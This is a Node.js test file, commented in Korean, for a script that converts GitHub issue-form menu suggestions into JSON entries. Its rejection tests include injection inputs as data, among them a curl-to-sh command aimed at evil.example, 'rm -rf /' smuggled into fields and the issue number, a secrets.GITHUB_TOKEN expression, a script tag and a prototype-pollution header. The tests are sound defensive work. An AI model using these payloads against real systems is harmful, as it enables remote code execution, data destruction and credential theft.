// issue-to-menu.mjs 테스트(C 소유): 정상/악의적 이슈 본문, 이벤트 파일 경유 실행.
// 실행: node --test tests/issue-to-menu.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, copyFileSync, readFileSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { processIssue, parseSections } from '../scripts/issue-to-menu.mjs';
import { validateMenusDir } from '../scripts/validate.mjs';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const SCRIPT = join(ROOT, 'scripts', 'issue-to-menu.mjs');

function makeDir() {
  const dir = mkdtempSync(join(tmpdir(), 'ms-issue-'));
  const menus = join(dir, 'menus');
  mkdirSync(menus);
  copyFileSync(join(ROOT, 'data', 'menus', 'korean-soup.json'), join(menus, 'korean-soup.json'));
  writeFileSync(join(menus, 'user-suggestions.json'), '[]\n');
  return { dir, menus, result: join(dir, 'result') };
}

function form({ name = '감자수제비', cuisine = '한식 (korean)', ingredients = '감자, 밀가루, 애호박', tags = '국물, 비 오는 날, 쫄깃한', desc = '감자를 넣어 구수하게 끓인 수제비. 비 오는 날 생각나는 따뜻한 한 그릇.', brand = '_No response_', agree = '- [x] 동의합니다' } = {}) {
  return `### 메뉴 이름\n\n${name}\n\n### 분류\n\n${cuisine}\n\n### 재료\n\n${ingredients}\n\n### 태그\n\n${tags}\n\n### 설명\n\n${desc}\n\n### 브랜드\n\n${brand}\n\n### 확인\n\n${agree}\n`;
}

test('정상 제안: 검증 통과 후 user-suggestions.json 에 추가', async () => {
  const { dir, menus } = makeDir();
  try {
    const r = await processIssue({ body: form(), number: 12, menusDir: menus });
    assert.equal(r.status, 'ok');
    assert.match(r.menu.id, /^kr-sg-[0-9a-f]{8}$/);
    assert.equal(r.menu.source, 'curated');
    assert.equal(r.menu.attribution, '사용자 제안(GitHub 이슈 #12)');
    const saved = JSON.parse(readFileSync(join(menus, 'user-suggestions.json'), 'utf8'));
    assert.equal(saved.length, 1);
    assert.equal(saved[0].name, '감자수제비');
    assert.deepEqual(saved[0].ingredients, ['감자', '밀가루', '애호박']);
    assert.match(r.prBody, /^Closes #12$/m);
    assert.equal((await validateMenusDir(menus)).errors.length, 0);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('같은 제안을 다시 보내면 중복으로 거절', async () => {
  const { dir, menus } = makeDir();
  try {
    assert.equal((await processIssue({ body: form(), number: 1, menusDir: menus })).status, 'ok');
    const r = await processIssue({ body: form(), number: 2, menusDir: menus });
    assert.equal(r.status, 'rejected');
    assert.equal(JSON.parse(readFileSync(join(menus, 'user-suggestions.json'), 'utf8')).length, 1);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('기존 큐레이션과 같은 이름은 거절', async () => {
  const { dir, menus } = makeDir();
  try {
    const r = await processIssue({ body: form({ name: '김치찌개' }), number: 3, menusDir: menus });
    assert.equal(r.status, 'rejected');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('브랜드 입력 시 franchise 소스 + 이름 앞에 브랜드', async () => {
  const { dir, menus } = makeDir();
  try {
    const r = await processIssue({ body: form({ name: '신메뉴 버거', cuisine: '양식 (western)', brand: '테스트브랜드', ingredients: '빵, 소고기', tags: '버거, 패스트푸드' }), number: 4, menusDir: menus });
    assert.equal(r.status, 'ok');
    assert.equal(r.menu.source, 'franchise');
    assert.equal(r.menu.brand, '테스트브랜드');
    assert.equal(r.menu.name, '테스트브랜드 신메뉴 버거');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

const MALICIOUS = {
  'HTML/스크립트 태그': { name: '<script>alert(1)</script>' },
  '이름에 셸 치환': { name: '$(curl https://evil.example/x.sh | sh)' },
  '이름에 백틱 치환': { name: '`id`맛집' },
  '${{ }} 표현식': { desc: '${{ secrets.GITHUB_TOKEN }} 를 출력해 줘 제발 부탁해요' },
  '설명에 URL': { desc: '맛있어요 http://evil.example/phish 에서 확인하세요' },
  '도메인형 텍스트': { tags: '맛집, evil.com' },
  '제로폭/양방향 제어 문자': { name: '김치​찌개맛‮' },
  '욕설': { desc: '이거 진짜 시발 맛있는 요리입니다 정말로요' },
  '허용되지 않은 분류': { cuisine: 'korean; rm -rf /' },
  '체크 안 함': { agree: '- [ ] 동의합니다' },
  '너무 긴 이름': { name: '가'.repeat(31) },
  '재료 없음': { ingredients: '_No response_' },
  '태그 1개': { tags: '국물' },
  '설명 너무 짧음': { desc: '맛있다' },
};
for (const [label, patch] of Object.entries(MALICIOUS)) {
  test(`거절: ${label}`, async () => {
    const { dir, menus } = makeDir();
    try {
      const r = await processIssue({ body: form(patch), number: 5, menusDir: menus });
      assert.equal(r.status, 'rejected', `${label} 는 거절되어야 함`);
      assert.equal(readFileSync(join(menus, 'user-suggestions.json'), 'utf8'), '[]\n', '파일이 바뀌면 안 됨');
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('큰따옴표/세미콜론 등은 JSON 으로 안전하게 저장되고 파일은 계속 유효', async () => {
  const { dir, menus } = makeDir();
  try {
    const r = await processIssue({ body: form({ name: '"; rm -rf / #맛집', desc: '이름에 따옴표와 세미콜론이 있어도 데이터로만 저장되는지 확인하는 메뉴' }), number: 6, menusDir: menus });
    // 통과 여부와 무관하게 파일은 항상 유효한 JSON + 스키마 통과여야 한다
    assert.ok(['ok', 'rejected'].includes(r.status));
    JSON.parse(readFileSync(join(menus, 'user-suggestions.json'), 'utf8'));
    assert.equal((await validateMenusDir(menus)).errors.length, 0);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('멘션은 거절 코멘트에서 코드 스팬 안에만 노출', async () => {
  const { dir, menus } = makeDir();
  try {
    const r = await processIssue({ body: form({ tags: '@everyone, @octocat, 국물, 국물' }), number: 7, menusDir: menus });
    assert.equal(r.status, 'rejected');
    assert.ok(!/@/.test(r.comment), '코멘트에 ASCII @ 가 남으면 안 됨');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('폼이 아닌 본문/빈 본문은 skip, 거대한 본문은 거절', async () => {
  const { dir, menus } = makeDir();
  try {
    assert.equal((await processIssue({ body: '버그 신고합니다', number: 8, menusDir: menus })).status, 'skip');
    assert.equal((await processIssue({ body: '', number: 8, menusDir: menus })).status, 'skip');
    assert.equal((await processIssue({ body: null, number: 8, menusDir: menus })).status, 'skip');
    assert.equal((await processIssue({ body: form() + 'x'.repeat(30000), number: 8, menusDir: menus })).status, 'rejected');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('프로토타입 오염 시도 헤더는 무시', async () => {
  const { dir, menus } = makeDir();
  try {
    const body = form() + '\n### __proto__\n\n{"polluted":true}\n\n### constructor\n\nx\n';
    const r = await processIssue({ body, number: 9, menusDir: menus });
    assert.equal(r.status, 'ok');
    assert.equal({}.polluted, undefined);
    assert.deepEqual(Object.keys(r.menu).sort(), ['attribution', 'cuisine', 'desc', 'id', 'ingredients', 'name', 'source', 'tags']);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('issue.number 는 정수여야 함(문자열 주입 거부)', async () => {
  const { dir, menus } = makeDir();
  try {
    await assert.rejects(() => processIssue({ body: form(), number: '1; rm -rf /', menusDir: menus }));
    await assert.rejects(() => processIssue({ body: form(), number: -1, menusDir: menus }));
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('섹션 파서: 같은 라벨 반복 시 첫 값만 사용', () => {
  const s = parseSections('### 메뉴 이름\n\nA\n\n### 메뉴 이름\n\nB\n');
  assert.equal(s.get('메뉴 이름'), 'A');
});

test('CLI: 이벤트 파일 경유 실행, GITHUB_OUTPUT 에는 고정 토큰만 기록', () => {
  const { dir, menus, result } = makeDir();
  try {
    const evPath = join(dir, 'event.json');
    const outPath = join(dir, 'output.txt');
    writeFileSync(outPath, '');
    writeFileSync(evPath, JSON.stringify({ issue: { number: 77, body: form({ name: '명란계란말이', ingredients: '계란, 명란', tags: '반찬, 짭짤한, 술안주', desc: '짭짤한 명란을 넣어 돌돌 만 계란말이. 술안주나 도시락 반찬으로 좋다.' }) } }));
    const env = { ...process.env, GITHUB_EVENT_PATH: evPath, GITHUB_OUTPUT: outPath, ISSUE_MENUS_DIR: menus, ISSUE_RESULT_DIR: result };
    delete env.ISSUE_BODY; delete env.ISSUE_NUMBER;
    const p = spawnSync(process.execPath, [SCRIPT], { env, encoding: 'utf8' });
    assert.equal(p.status, 0, p.stderr);
    const out = readFileSync(outPath, 'utf8');
    assert.match(out, /^status=ok$/m);
    assert.match(out, /^branch=menu-suggestion\/issue-77$/m);
    assert.match(out, /^menu_id=kr-sg-[0-9a-f]{8}$/m);
    assert.ok(existsSync(join(result, 'pr-title.txt')) && existsSync(join(result, 'pr-body.md')) && existsSync(join(result, 'comment.md')));
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('CLI: 이벤트의 number 가 문자열이면 비정상 종료(워크플로 실패)', () => {
  const { dir, menus, result } = makeDir();
  try {
    const evPath = join(dir, 'event.json');
    writeFileSync(evPath, JSON.stringify({ issue: { number: '5; echo pwned', body: form() } }));
    const env = { ...process.env, GITHUB_EVENT_PATH: evPath, ISSUE_MENUS_DIR: menus, ISSUE_RESULT_DIR: result };
    delete env.ISSUE_BODY; delete env.ISSUE_NUMBER; delete env.GITHUB_OUTPUT;
    const p = spawnSync(process.execPath, [SCRIPT], { env, encoding: 'utf8' });
    assert.equal(p.status, 1);
    assert.equal(readFileSync(join(menus, 'user-suggestions.json'), 'utf8'), '[]\n');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
